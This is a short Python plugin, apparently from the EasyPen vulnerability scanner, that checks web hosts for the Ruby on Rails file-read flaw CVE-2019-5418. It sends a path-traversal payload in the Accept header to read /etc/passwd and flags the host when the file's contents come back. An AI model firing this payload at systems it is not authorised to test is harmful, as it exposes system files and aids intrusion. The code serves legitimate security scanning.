#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    try:
        target = '{}://{}:{}/robots'.format(service, ip, port)
        headers = {'Accept': '../../../../../../../../etc/passwd{{'}

        r = await http_client(ip, port).get(target, headers=headers, timeout=20)
        if 'root:x:' in r.text:
            ret = {
                'alert_group': 'Ruby On Rails LFR(CVE-2019-5418)',
                'affects': target,
                'details': 'get {} with headers:\n\n{}'.format(target, headers)
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 80, 'http', True, task_msg={})
    run_plugin_test(scan)
